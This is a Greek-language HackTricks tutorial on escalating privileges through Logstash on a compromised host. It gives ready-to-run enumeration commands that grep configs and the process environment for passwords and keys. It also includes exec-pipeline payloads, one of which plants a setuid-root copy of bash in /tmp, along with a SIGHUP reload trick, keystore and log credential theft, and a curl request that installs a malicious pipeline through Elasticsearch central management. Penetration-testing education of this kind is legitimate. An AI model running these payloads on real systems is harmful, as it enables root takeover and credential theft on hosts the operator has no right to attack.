# Κλιμάκωση Privilege στο Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Το Logstash χρησιμοποιείται για **συλλογή, μετασχηματισμό και αποστολή logs** μέσω ενός συστήματος γνωστού ως **pipelines**. Αυτά τα pipelines αποτελούνται από στάδια **input**, **filter** και **output**. Μια ενδιαφέρουσα πτυχή προκύπτει όταν το Logstash εκτελείται σε ένα παραβιασμένο μηχάνημα.

### Διαμόρφωση Pipeline

Τα pipelines διαμορφώνονται στο αρχείο **/etc/logstash/pipelines.yml**, το οποίο παραθέτει τις τοποθεσίες των διαμορφώσεων των pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Αυτό το file αποκαλύπτει πού βρίσκονται τα **.conf** files, τα οποία περιέχουν configurations για pipelines. Όταν χρησιμοποιείται ένα **Elasticsearch output module**, είναι συνηθισμένο τα **pipelines** να περιλαμβάνουν **Elasticsearch credentials**, τα οποία συχνά διαθέτουν εκτεταμένα privileges, επειδή το Logstash χρειάζεται να γράφει data στο Elasticsearch. Τα wildcards στα configuration paths επιτρέπουν στο Logstash να εκτελεί όλα τα pipelines που ταιριάζουν στον καθορισμένο directory.

Αν το Logstash ξεκινήσει με `-f <directory>` αντί για `pipelines.yml`, **όλα τα files μέσα σε αυτόν τον directory συνενώνονται με lexicographical order και αναλύονται ως ένα ενιαίο config**. Αυτό δημιουργεί 2 offensive implications:

- Ένα dropped file όπως το `000-input.conf` ή το `zzz-output.conf` μπορεί να αλλάξει τον τρόπο με τον οποίο συναρμολογείται το τελικό pipeline
- Ένα malformed file μπορεί να αποτρέψει τη φόρτωση ολόκληρου του pipeline, επομένως επικυρώστε προσεκτικά τα payloads πριν βασιστείτε στο auto-reload

### Fast Enumeration σε Compromised Host

Σε ένα box όπου είναι εγκατεστημένο το Logstash, κάντε γρήγορα inspect:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Ελέγξτε επίσης αν είναι δυνατή η πρόσβαση στο local monitoring API. Από προεπιλογή, συνδέεται στη διεύθυνση **127.0.0.1:9600**, κάτι που συνήθως αρκεί αφού αποκτήσετε πρόσβαση στο host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Αυτό συνήθως σας παρέχει pipeline IDs, runtime details και επιβεβαίωση ότι το τροποποιημένο pipeline έχει φορτωθεί.

Τα credentials που ανακτώνται από το Logstash συνήθως ξεκλειδώνουν το **Elasticsearch**, επομένως ελέγξτε [αυτήν τη σελίδα σχετικά με το Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation μέσω Writable Pipelines

Για να επιχειρήσετε privilege escalation, εντοπίστε πρώτα τον χρήστη υπό τον οποίο εκτελείται η υπηρεσία Logstash, συνήθως τον χρήστη **logstash**. Βεβαιωθείτε ότι πληροίτε **ένα** από τα παρακάτω κριτήρια:

- Διαθέτετε **write access** σε ένα αρχείο pipeline **.conf** **ή**
- Το αρχείο **/etc/logstash/pipelines.yml** χρησιμοποιεί wildcard και μπορείτε να γράψετε στον φάκελο-στόχο

Επιπλέον, πρέπει να πληρούται **μία** από τις παρακάτω συνθήκες:

- Έχετε τη δυνατότητα να κάνετε restart την υπηρεσία Logstash **ή**
- Το αρχείο **/etc/logstash/logstash.yml** έχει ορισμένο το **config.reload.automatic: true**

Όταν υπάρχει wildcard στη διαμόρφωση, η δημιουργία ενός αρχείου που ταιριάζει με αυτό το wildcard επιτρέπει την εκτέλεση εντολών. Για παράδειγμα:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Εδώ, το **interval** καθορίζει τη συχνότητα εκτέλεσης σε δευτερόλεπτα. Στο συγκεκριμένο παράδειγμα, η εντολή **whoami** εκτελείται κάθε 120 δευτερόλεπτα και η έξοδός της κατευθύνεται στο **/tmp/output.log**.

Με το **config.reload.automatic: true** στο **/etc/logstash/logstash.yml**, το Logstash εντοπίζει και εφαρμόζει αυτόματα νέες ή τροποποιημένες pipeline configurations χωρίς να απαιτείται restart. Αν δεν υπάρχει wildcard, μπορούν και πάλι να γίνουν τροποποιήσεις στις υπάρχουσες configurations, αλλά συνιστάται προσοχή για την αποφυγή διακοπών.

### Πιο αξιόπιστα Pipeline Payloads

Το `exec` input plugin εξακολουθεί να λειτουργεί στις τρέχουσες εκδόσεις και απαιτεί είτε ένα `interval` είτε ένα `schedule`. Εκτελείται με **forking** του Logstash JVM, επομένως, αν η μνήμη είναι περιορισμένη, το payload μπορεί να αποτύχει με `ENOMEM` αντί να εκτελεστεί σιωπηρά.

Ένα πιο πρακτικό privilege-escalation payload είναι συνήθως αυτό που αφήνει ένα durable artifact:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Εάν δεν έχετε δικαιώματα επανεκκίνησης, αλλά μπορείτε να στείλετε σήμα στη διεργασία, το Logstash υποστηρίζει επίσης επαναφόρτωση που ενεργοποιείται από **SIGHUP** σε Unix-like συστήματα:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Να έχετε υπόψη ότι δεν υποστηρίζουν όλα τα plugins την επαναφόρτωση. Για παράδειγμα, το input **stdin** αποτρέπει την αυτόματη επαναφόρτωση, επομένως μην θεωρείτε δεδομένο ότι το `config.reload.automatic` θα εφαρμόζει πάντα τις αλλαγές σας.

### Κλοπή Secrets από το Logstash

Πριν επικεντρωθείτε αποκλειστικά στην εκτέλεση κώδικα, συλλέξτε τα δεδομένα στα οποία έχει ήδη πρόσβαση το Logstash:

- Τα credentials σε plaintext συχνά είναι hardcoded μέσα σε outputs `elasticsearch {}`, στο `http_poller`, σε JDBC inputs ή σε ρυθμίσεις που σχετίζονται με cloud
- Οι secure settings μπορεί να βρίσκονται στο **`/etc/logstash/logstash.keystore`** ή σε άλλο directory που ορίζεται από το `path.settings`
- Ο κωδικός πρόσβασης του keystore παρέχεται συχνά μέσω του **`LOGSTASH_KEYSTORE_PASS`**, ενώ οι εγκαταστάσεις που βασίζονται σε packages συνήθως τον αντλούν από το **`/etc/sysconfig/logstash`**
- Η επέκταση environment variables με `${VAR}` επιλύεται κατά την εκκίνηση του Logstash, επομένως αξίζει να ελέγξετε το environment του service

Χρήσιμοι έλεγχοι:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Αυτό αξίζει επίσης να ελεγχθεί, επειδή το **CVE-2023-46672** έδειξε ότι το Logstash μπορούσε να καταγράφει ευαίσθητες πληροφορίες στα logs υπό συγκεκριμένες συνθήκες. Σε έναν post-exploitation host, παλιά Logstash logs και καταχωρίσεις του `journald` ενδέχεται επομένως να αποκαλύπτουν credentials, ακόμη και αν το τρέχον config αναφέρεται στο keystore αντί να αποθηκεύει secrets inline.

### Κατάχρηση Κεντρικής Διαχείρισης Pipeline

Σε ορισμένα περιβάλλοντα, το host **δεν** βασίζεται καθόλου σε τοπικά αρχεία `.conf`. Αν έχει ρυθμιστεί το **`xpack.management.enabled: true`**, το Logstash μπορεί να αντλεί centrally managed pipelines από το Elasticsearch/Kibana και, μετά την ενεργοποίηση αυτής της λειτουργίας, τα τοπικά pipeline configs δεν αποτελούν πλέον την πηγή αλήθειας.

Αυτό σημαίνει ένα διαφορετικό attack path:

1. Ανάκτηση Elastic credentials από τις τοπικές ρυθμίσεις του Logstash, το keystore ή τα logs
2. Έλεγχος του αν ο λογαριασμός διαθέτει το **`manage_logstash_pipelines`** cluster privilege
3. Δημιουργία ή αντικατάσταση ενός centrally managed pipeline, ώστε ο Logstash host να εκτελέσει το payload σας στο επόμενο poll interval

Το Elasticsearch API που χρησιμοποιείται για αυτήν τη λειτουργία είναι:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Αυτό είναι ιδιαίτερα χρήσιμο όταν τα τοπικά αρχεία είναι μόνο για ανάγνωση, αλλά το Logstash έχει ήδη καταχωριστεί για την ανάκτηση pipelines από απομακρυσμένη τοποθεσία.

## Αναφορές

- [Elastic Docs: Επαναφόρτωση του αρχείου ρυθμίσεων](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Ρύθμιση κεντρικής διαχείρισης pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
